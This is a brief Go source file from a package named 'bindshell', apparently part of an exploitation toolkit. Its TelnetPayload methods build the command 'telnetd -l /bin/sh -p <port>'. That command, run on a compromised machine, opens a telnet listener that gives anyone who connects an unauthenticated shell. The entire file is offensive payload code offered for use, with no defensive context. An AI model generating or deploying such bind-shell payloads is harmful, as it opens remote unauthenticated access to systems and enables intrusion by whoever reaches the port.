package bindshell

import (
	"fmt"
)

const TelnetDefault = "telnetd -l /bin/sh -p %d"

func (telnet *TelnetPayload) Default(bport int) string {
	return telnet.TelnetdLogin(bport)
}

func (telnet *TelnetPayload) TelnetdLogin(bport int) string {
	return fmt.Sprintf(TelnetDefault, bport)
}
